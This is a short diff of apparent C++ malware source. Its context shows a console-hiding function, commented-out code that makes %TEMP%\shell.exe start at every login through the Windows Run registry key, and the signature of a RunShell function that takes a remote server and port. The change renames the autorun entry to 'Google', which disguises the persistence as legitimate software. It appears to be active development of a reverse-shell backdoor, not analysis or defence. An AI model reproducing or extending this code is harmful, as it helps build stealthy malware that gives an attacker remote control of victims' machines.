@@ -14,7 +14,7 @@ void HideConsole()
 //    std::wstring progPath = L"%TEMP%\\shell.exe";
 //    HKEY hkey = NULL;
 //    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
-//    LONG status = RegSetValueEx(hkey, L"Google Shit", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+//    LONG status = RegSetValueEx(hkey, L"Google", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
 // }
 
 void RunShell(char* RemoteServer, int Port) {
